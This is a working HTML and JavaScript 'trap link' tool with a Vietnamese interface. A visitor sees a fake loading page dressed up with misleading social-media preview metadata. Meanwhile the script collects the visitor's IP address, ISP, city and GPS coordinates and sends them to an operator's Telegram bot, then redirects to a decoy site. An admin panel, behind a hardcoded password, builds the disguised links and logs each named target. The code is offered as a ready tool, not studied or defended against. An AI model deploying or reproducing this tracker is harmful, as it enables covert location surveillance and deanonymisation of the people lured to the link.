<body id="main-body" class="victim-body">

    <div id="ui-victim">
        <div class="loader" style="margin: 0 auto;"></div>
        <div class="mt-4 text-[#777] text-[13px] text-center">ƒêang t·∫£i t√†i li·ªáu...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-10">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-6">
                <div>
                    <h1 class="text-xl font-black text-white italic tracking-tighter">BCA <span class="text-blue-500 text-2xl">A02</span></h1>
                    <p class="text-[9px] text-gray-500 uppercase tracking-widest"><span class="live-dot"></span>H·ªá th·ªëng gi√°m s√°t A02</p>
                </div>
                <button onclick="logout()" class="text-[10px] bg-red-950/20 text-red-500 border border-red-900/50 px-4 py-2 rounded-lg font-bold">THO√ÅT</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">

                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest">1. C√†i ƒë·∫∑t Ng·ª•y trang (Meta)</h3>
                        <div class="space-y-3">
                            <input id="meta-title-in" type="text" placeholder="Ti√™u ƒë·ªÅ trang..." class="input-dark" oninput="updatePreview()">
                            <textarea id="meta-desc-in" placeholder="M√¥ t·∫£ n·ªôi dung..." class="input-dark h-20" oninput="updatePreview()"></textarea>
                            <input id="meta-img-in" type="text" placeholder="Link ·∫£nh (JPG/PNG)..." class="input-dark" oninput="updatePreview()">
                        </div>
                        
                        <div class="mt-4">
                            <p class="text-[9px] text-gray-500 mb-2 uppercase">Xem tr∆∞·ªõc hi·ªÉn th·ªã (Zalo/FB):</p>
                            <div class="preview-card">
                                <img id="pre-img" src="" class="preview-img">
                                <div class="preview-info">
                                    <div id="pre-title" class="font-bold text-sm truncate">Ti√™u ƒë·ªÅ...</div>
                                    <div id="pre-desc" class="text-[11px] text-gray-500 line-clamp-2">M√¥ t·∫£...</div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="glass p-6 space-y-4">
                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest">2. Link & Robot</h3>
                        <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                        <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        <input id="cfg-rd" type="text" placeholder="Link Redirect" class="input-dark">
                        <input id="in-target" type="text" placeholder="T√™n m·ª•c ti√™u (Ghi ch√∫)" class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg text-[10px] uppercase">L∆∞u & T·∫°o Link</button>
                        
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono leading-relaxed"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-8">
                    <div class="glass min-h-[600px] flex flex-col overflow-hidden">
                        <div class="p-4 border-b border-gray-800 flex justify-between bg-black/20">
                            <h3 class="text-[10px] font-black text-white uppercase tracking-widest">Nh·∫≠t k√Ω m·ª•c ti√™u</h3>
                            <button onclick="clearLogs()" class="text-[10px] text-gray-500 hover:text-red-400">X√≥a nh·∫≠t k√Ω</button>
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px]">
                                    <tr>
                                        <th class="p-4">ƒê·ªëi t∆∞·ª£ng</th>
                                        <th class="p-4">IP / Nh√† m·∫°ng</th>
                                        <th class="p-4">V·ªã tr√≠</th>
                                        <th class="p-4 text-right">GPS</th>
                                    </tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let config = {
            t: "",
            i: "",
            r: "https://google.com",
            mt: "Ti·ªÉu s·ª≠ ƒê·ª©c qu·ªëc c√¥ng ƒê√†o Minh Qu√¢n",
            md: "T·ªôi √°c c·ªông s·∫£n v·ªõi ƒê√†o Minh Qu√¢n v√† c√¥ng ∆°n cao c·∫£ c·ªßa Ng√†i.",
            mi: "https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v21_auth') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('v21_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startTracking(); }
        };

        // --- TRACKING LOGIC ---
        async function startTracking() {
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(atob(v)); 
                // √Åp d·ª•ng Meta ƒë·ªông
                document.title = config.mt;
            } catch(e) {}

            const target = urlParams.get('name') || 'Guest';
            let ipInfo = null;

            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipInfo = res;
                addLog({ name: target, ip: res.ip, isp: res.org, city: res.city, time: new Date().toLocaleTimeString(), st: 'IP' });
                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b> ƒë√£ v√†o\nüåê IP: " + res.ip + "\nüìç V√πng: " + res.city)}`);
            } catch(e) {}

            const finalJump = () => window.location.replace(config.r);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    updateLog(target, p.coords.latitude, p.coords.longitude);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> GPS OK\nüìç Link: https://www.google.com/maps?q=$" + p.coords.latitude + "," + p.coords.longitude)}`);
                    finalJump();
                }, finalJump, { timeout: 5000 });
            } else { finalJump(); }
            setTimeout(finalJump, 8000);
        }

        // --- ADMIN FUNCTIONS ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            const saved = localStorage.getItem('v21_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            document.getElementById('meta-title-in').value = config.mt;
            document.getElementById('meta-desc-in').value = config.md;
            document.getElementById('meta-img-in').value = config.mi;
            
            updatePreview();
            renderLogs();
            setInterval(renderLogs, 5000);
        }

        function updatePreview() {
            const t = document.getElementById('meta-title-in').value;
            const d = document.getElementById('meta-desc-in').value;
            const i = document.getElementById('meta-img-in').value;
            
            document.getElementById('pre-title').innerText = t || "Ti√™u ƒë·ªÅ...";
            document.getElementById('pre-desc').innerText = d || "M√¥ t·∫£ n·ªôi dung...";
            document.getElementById('pre-img').src = i || "https://via.placeholder.com/300x150?text=No+Image";
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('meta-title-in').value;
            config.md = document.getElementById('meta-desc-in').value;
            config.mi = document.getElementById('meta-img-in').value;
            
            localStorage.setItem('v21_cfg', JSON.stringify(config));
            
            const name = document.getElementById('in-target').value || 'Target';
            const base = window.location.href.split('?')[0];
            const finalLink = `${base}?name=${encodeURIComponent(name)}&v=${btoa(JSON.stringify(config))}`;
            
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = finalLink;
            alert("ƒê√£ l∆∞u v√† t·∫°o link b·∫´y!");
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v21_logs') || '[]');
            const html = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4"><span class="text-white font-bold">${l.name}</span><br><span class="text-[9px] text-gray-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-600">${l.isp}</span></td>
                    <td class="p-4 text-gray-400 uppercase text-[10px]">${l.city}</td>
                    <td class="p-4 text-right">
                        ${l.st === 'GPS' ? `<a href="https://www.google.com/maps?q=$${l.lat},${l.lon}" target="_blank" class="text-green-500 font-bold underline">XEM MAP</a>` : `<span class="text-gray-700 italic">IP Only</span>`}
                    </td>
                </tr>
            `).join('');
            document.getElementById('log-list').innerHTML = html;
        }

        function addLog(data) {
            let logs = JSON.parse(localStorage.getItem('v21_logs') || '[]');
            logs.unshift(data);
            localStorage.setItem('v21_logs', JSON.stringify(logs.slice(0, 100)));
        }

        function updateLog(name, lat, lon) {
            let logs = JSON.parse(localStorage.getItem('v21_logs') || '[]');
            if(logs.length > 0 && logs[0].name === name) {
                logs[0].st = 'GPS'; logs[0].lat = lat; logs[0].lon = lon;
            }
            localStorage.setItem('v21_logs', JSON.stringify(logs));
        }

        function clearLogs() { localStorage.removeItem('v21_logs'); renderLogs(); }
        function logout() { localStorage.removeItem('v21_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ copy!"); }
    </script>
